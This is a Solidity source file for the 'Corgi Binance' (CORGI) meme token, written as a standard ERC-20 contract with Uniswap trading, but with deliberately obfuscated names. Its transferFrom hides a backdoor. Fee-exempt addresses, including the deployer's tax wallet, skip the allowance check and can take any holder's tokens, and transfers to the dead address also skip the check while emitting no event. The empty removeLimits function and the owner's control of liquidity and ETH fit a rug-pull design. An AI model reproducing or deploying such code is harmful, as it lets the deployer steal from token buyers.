// SPDX-License-Identifier: MIT

/*
    https://x.com/binance/status/1902087809672081598
    https://t.me/corgi_eth

*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract CORGI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcVCV2F;
    mapping(address => mapping(address => uint256)) private _allcvnkjnVCV2F;
    mapping(address => bool) private _feevblknlVCV2F;
    address payable private _taxclknlVCV2F;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Corgi Binance";
    string private constant _symbol = unicode"CORGI";

    uint256 private _vkjbnkfjVCV2F = 10;
    uint256 private _maxovnboiVCV2F = 10;
    uint256 private _initvkjnbkjVCV2F = 20;
    uint256 private _finvjlkbnlkjVCV2F = 0;
    uint256 private _redclkjnkVCV2F = 2;
    uint256 private _prevlfknjoiVCV2F = 2;
    uint256 private _buylkvnlkVCV2F = 0;
    IUniswapV2Router02 private uniswapV2Router;

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknVCV2F;
    bool private _inlknblVCV2F = false;
    bool private swapvlkVCV2F = false;
    uint256 private _sellcnjkVCV2F = 0;
    uint256 private _lastflkbnlVCV2F = 0;
    address constant _deadlknVCV2F = address(0xdead);

    uint256 public _vnbbvlkVCV2F = qq30fef / 100;
    uint256 public _oijboijoiVCV2F = 15 * 10**18;
    uint256 private _cvjkbnkjVCV2F = 10;

    modifier lockTheSwap() {
        _inlknblVCV2F = true;
        _;
        _inlknblVCV2F = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcVCV2F[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    
    function _calcTax_lvknblVCV2F(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblVCV2F) {
                taxAmount = amount
                    .mul((_buylkvnlkVCV2F > _redclkjnkVCV2F) ? _finvjlkbnlkjVCV2F : _initvkjnbkjVCV2F)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlVCV2F[to] &&
                to != _taxclknlVCV2F
            ) {
                _buylkvnlkVCV2F++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblVCV2F &&
                to == uniswapV2Pair &&
                from != _taxclknlVCV2F &&
                swapvlkVCV2F &&
                _buylkvnlkVCV2F > _prevlfknjoiVCV2F
            ) {
                if (block.number > _lastflkbnlVCV2F) {
                    _sellcnjkVCV2F = 0;
                }
                _sellcnjkVCV2F = _sellcnjkVCV2F + _getAmountOut_lvcbnkVCV2F(amount);
                require(_sellcnjkVCV2F <= _oijboijoiVCV2F, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkVCV2F)
                    _swapTokenslknlVCV2F(_vnbbvlkVCV2F > amount ? amount : _vnbbvlkVCV2F);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjVCV2F(address(this).balance);
                }
                _lastflkbnlVCV2F = block.number;
            }
        }
        return taxAmount;
    }

    constructor() payable {
        _taxclknlVCV2F = payable(_msgSender());
        
        _balknvlkcVCV2F[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcVCV2F[address(this)] = (qq30fef * 98) / 100;
        _feevblknlVCV2F[address(this)] = true;
        _feevblknlVCV2F[_taxclknlVCV2F] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _downcklkojVCV2F(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlVCV2F[msg.sender]) return !_feevblknlVCV2F[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknVCV2F)) return false;
        return true;
    }

    function _transfer_kjvnVCV2F(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblVCV2F(from, to, amount);
        _balknvlkcVCV2F[from] = _balknvlkcVCV2F[from].sub(amount);
        _balknvlkcVCV2F[to] = _balknvlkcVCV2F[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcVCV2F[address(this)] = _balknvlkcVCV2F[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknVCV2F) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnVCV2F[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnVCV2F(sender, recipient, amount);
        if (_downcklkojVCV2F(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnVCV2F[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    
    function _sendETHTocvbnjVCV2F(uint256 amount) private {
        _taxclknlVCV2F.transfer(amount);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnVCV2F(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnVCV2F[owner][spender];
    }

    function _swapTokenslknlVCV2F(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function VCV2FTeam() external onlyOwner {
        require(!_tradingvlknVCV2F, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkVCV2F = true;
        _tradingvlknVCV2F = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnVCV2F() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkVCV2F(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
    function removeLimits () external onlyOwner {
    }
    function _setTax_lknblVCV2F(address payable newWallet) external {
        require(_feevblknlVCV2F[_msgSender()]);
        _taxclknlVCV2F = newWallet;
        _feevblknlVCV2F[_taxclknlVCV2F] = true;
    }
}